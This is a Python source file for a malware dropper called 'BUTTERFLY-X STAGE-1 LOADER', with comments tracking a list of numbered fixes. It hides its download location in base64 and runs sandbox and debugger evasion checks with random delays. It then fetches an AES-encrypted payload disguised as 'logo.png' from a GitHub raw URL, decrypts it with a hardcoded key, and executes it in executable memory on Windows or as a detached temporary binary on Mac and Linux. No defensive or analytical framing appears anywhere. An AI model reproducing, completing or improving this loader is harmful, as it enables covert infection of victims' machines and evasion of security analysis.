#!/usr/bin/env python3

# -*- coding: utf-8 -*-

# BUTTERFLY-X STAGE-1 LOADER v3.1

import os

import sys

import platform

import requests

import ctypes

import tempfile

import subprocess

import time

import hashlib

import random  # FIX 1: Added missing import

import base64  # FIX 2: Added missing import

import socket

from Crypto.Cipher import AES

from Crypto.Util.Padding import unpad  # FIX 4: Proper unpadding

# =====================

# GHOST CONFIGURATION

# =====================

# FIX 3: 32-byte key (exactly 32 chars)

_0x1f8c = b"butterfly_x_secret_key_32byte!!!"

_0x4e8f = [

    "eW91cl9mYWtlX2dpdGh1Yl91c2VybmFtZQ==",  # base64 GitHub username

    "cHJvamVjdC1idXR0ZXJmbHkteA==",  # base64 repo name

    "bG9nby5wbmc="  # base64 payload name

]

_0xd2a7 = [base64.b64decode(x).decode() for x in _0x4e8f]


# =====================

# SECURE UTILITIES

# =====================

def _0x8a9e(data: bytearray):
    """Secure memory zeroing"""

    for i in range(len(data)):
        data[i] = 0


# =====================

# ANTI-ANALYSIS CHECKS

# =====================

def _0x8f3d():
    """Early-stage evasion"""

    # Debugger detection

    if hasattr(sys, 'gettrace') and sys.gettrace():
        sys.exit(0)

    # FIX 6: Robust username detection

    try:

        username = (

                os.getlogin()

                or os.getenv("USERNAME")

                or os.getenv("USER")

                or ""

        ).lower()

    except OSError:

        username = ""

    if any(x in username for x in ["sandbox", "malware", "test", "vm"]):
        sys.exit(0)

    # FIX 10: Entropy-based delay

    delay = random.randint(3, 10) + hash(os.urandom(16)) % 7

    time.sleep(delay)


# =====================

# NETWORK VALIDATION

# =====================

def _0xc3b1(url):
    """TLS and response validation with pinned cert"""
    try:
        cert_path = os.path.join(sys._MEIPASS if hasattr(sys, '_MEIPASS') else os.path.dirname(__file__), 'github.pem')

        response = requests.get(
            url,
            timeout=15,
            verify=cert_path,  # Pin GitHub cert
            headers={'User-Agent': 'Mozilla/5.0'}
        )

        if response.status_code != 200 or not response.content:
            return None

        return response.content

    except Exception:
        return None


# =====================

# CORE LOADER FUNCTIONS

# =====================

def _0x9d4a():
    """OS detection"""

    sys_platform = sys.platform.lower()

    if 'win32' in sys_platform or 'win64' in sys_platform:

        return 'win'

    elif 'darwin' in sys_platform:

        return 'mac'

    elif 'linux' in sys_platform:

        return 'lin'

    return 'unknown'


def _0x5a1d(data: bytes) -> bytearray:
    """Secure AES decryption with zeroing"""

    try:

        iv = data[:16]

        cipher = AES.new(_0x1f8c, AES.MODE_CBC, iv)

        # FIX 4: Proper PKCS7 unpadding

        decrypted = unpad(

            cipher.decrypt(data[16:]),

            AES.block_size

        )

        # FIX 5: Integrity verification

        if hashlib.sha256(decrypted).hexdigest() != "D37723CC27917C44D811A5F3C9D2F26B375618EC6C48A95E25E77F5CC111FFD7":
            raise ValueError("Payload integrity compromised")

        return bytearray(decrypted)

    except:

        return bytearray()


def _0x3e6b():
    """Stealth payload execution"""

    payload_url = f"https://raw.githubusercontent.com/{_0xd2a7[0]}/{_0xd2a7[1]}/main/{_0xd2a7[2]}"

    # FIX 9: Secure download

    encrypted = _0xc3b1(payload_url)

    if not encrypted:
        return False

    # Secure decryption

    decrypted = _0x5a1d(encrypted)

    if not decrypted:
        return False

    os_type = _0x9d4a()

    # Windows in-memory execution

    if os_type == 'win':

        try:

            # Allocate executable memory

            mem = ctypes.windll.kernel32.VirtualAlloc(

                0, len(decrypted),

                0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE

                0x40  # PAGE_EXECUTE_READWRITE

            )

            if not mem:
                return False

            # Copy and execute

            ctypes.memmove(mem, decrypted, len(decrypted))

            thread = ctypes.windll.kernel32.CreateThread(0, 0, mem, 0, 0, 0)

            if thread:
                ctypes.windll.kernel32.WaitForSingleObject(thread, -1)

                return True

        finally:

            # FIX 7: Secure memory zeroing

            _0x8a9e(decrypted)



    # Mac/Linux execution

    else:

        try:

            with tempfile.NamedTemporaryFile(delete=False, suffix='.bin') as tmp:

                tmp.write(decrypted)

                tmp_path = tmp.name

            os.chmod(tmp_path, 0o755)

            # FIX 11: Backward-compatible process launch

            kwargs = {

                'stdout': subprocess.DEVNULL,

                'stderr': subprocess.DEVNULL,

                'stdin': subprocess.DEVNULL

            }

            if sys.version_info >= (3, 2):
                kwargs['start_new_session'] = True

            subprocess.Popen([tmp_path], **kwargs)

            # FIX 8: Temp file cleanup

            for _ in range(5):  # 5 retries

                try:

                    os.unlink(tmp_path)

                    break

                except:

                    time.sleep(1)

            return True

        finally:

            # FIX 7: Secure memory zeroing

            _0x8a9e(decrypted)


# =====================

# MAIN EXECUTION

# =====================

if __name__ == "__main__":

    try:

        # FIX 12: Basic status reporting

        debug_file = os.path.join(tempfile.gettempdir(), "b_loader.log")

        with open(debug_file, 'w') as f:

            f.write(f"Loader started at {time.ctime()}\n")

        _0x8f3d()  # Anti-analysis

        if _0x3e6b():

            # FIX 10: Randomized exit timing

            time.sleep(2 + random.random() * 3)

            sys.exit(0)

        else:

            # FIX 10: Entropy-based failure delay

            delay = 15 + hash(os.urandom(8)) % 15

            time.sleep(delay)

            sys.exit(1)



    except Exception as e:

        # FIX 12: Error logging

        with open(debug_file, 'a') as f:

            f.write(f"ERROR: {str(e)}\n")

        sys.exit(1)
        z